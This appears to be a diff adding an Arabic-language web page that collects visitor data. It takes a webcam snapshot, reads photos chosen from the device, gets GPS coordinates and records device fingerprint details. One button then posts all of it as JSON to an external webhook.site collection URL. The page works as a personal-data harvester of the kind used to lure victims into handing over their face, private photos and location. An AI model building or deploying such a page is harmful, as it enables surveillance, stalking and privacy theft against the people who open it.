@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>جمع البيانات بالتفاعل</title>
+</head>
+<body>
+  <h2>جمع البيانات بالتفاعل</h2>
+
+  <button id="btnCamera">تشغيل الكاميرا وأخذ صورة</button>
+  <br /><br />
+  <video id="video" autoplay style="display:none; width:300px; border:1px solid #000;"></video>
+  <br />
+  <canvas id="canvas" style="display:none;"></canvas>
+  <img id="photo" alt="صورة الكاميرا" style="display:none; width:300px; border:1px solid #000; margin-top:10px;" />
+  
+  <hr />
+
+  <button id="btnPhotos">اختيار الصور من الجهاز</button>
+  <div id="photosContainer"></div>
+
+  <hr />
+
+  <button id="btnLocation">إرسال الموقع</button>
+  <pre id="locationResult"></pre>
+
+  <hr />
+
+  <button id="btnSendData">إرسال البيانات كاملة</button>
+
+  <pre id="result"></pre>
+
+  <script>
+    let cameraStream = null;
+    let capturedImage = null;
+    let selectedPhotos = [];
+    let userLocation = null;
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photo = document.getElementById('photo');
+    const photosContainer = document.getElementById('photosContainer');
+    const locationResult = document.getElementById('locationResult');
+    const result = document.getElementById('result');
+
+    // تشغيل الكاميرا وأخذ صورة
+    document.getElementById('btnCamera').onclick = async () => {
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = cameraStream;
+        video.style.display = 'block';
+
+        // انتظر 3 ثواني قبل أخذ الصورة
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          capturedImage = canvas.toDataURL('image/png');
+          photo.src = capturedImage;
+          photo.style.display = 'block';
+
+          // وقف الكاميرا بعد التصوير
+          cameraStream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+        }, 3000);
+      } catch (err) {
+        alert('فشل تشغيل الكاميرا: ' + err.message);
+      }
+    };
+
+    // اختيار الصور من الجهاز
+    document.getElementById('btnPhotos').onclick = () => {
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.accept = 'image/*';
+      input.multiple = true;
+
+      input.onchange = () => {
+        selectedPhotos = [];
+        photosContainer.innerHTML = '';
+        const files = input.files;
+        for (let i = 0; i < files.length; i++) {
+          const reader = new FileReader();
+          reader.onload = (e) => {
+            selectedPhotos.push(e.target.result);
+            const img = document.createElement('img');
+            img.src = e.target.result;
+            img.style.width = '100px';
+            img.style.margin = '5px';
+            photosContainer.appendChild(img);
+          };
+          reader.readAsDataURL(files[i]);
+        }
+      };
+
+      input.click();
+    };
+
+    // أخذ الموقع
+    document.getElementById('btnLocation').onclick = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            userLocation = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+            };
+            locationResult.innerText = JSON.stringify(userLocation, null, 2);
+          },
+          (err) => {
+            locationResult.innerText = 'خطأ في الحصول على الموقع: ' + err.message;
+          }
+        );
+      } else {
+        locationResult.innerText = 'الموقع غير مدعوم في المتصفح.';
+      }
+    };
+
+    // إرسال البيانات إلى webhook
+    document.getElementById('btnSendData').onclick = () => {
+      const deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        location: userLocation,
+        cameraImage: capturedImage,
+        photos: selectedPhotos,
+      };
+
+      fetch('https://webhook.site/73751902-f87d-4c45-a29d-74eb122134b8', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(deviceData),
+      })
+        .then(() => {
+          result.innerText = 'تم إرسال البيانات بنجاح:\n' + JSON.stringify(deviceData, null, 2);
+        })
+        .catch((err) => {
+          result.innerText = 'حدث خطأ أثناء الإرسال: ' + err.message;
+        });
+    };
+  </script>
+</body>
+</html>
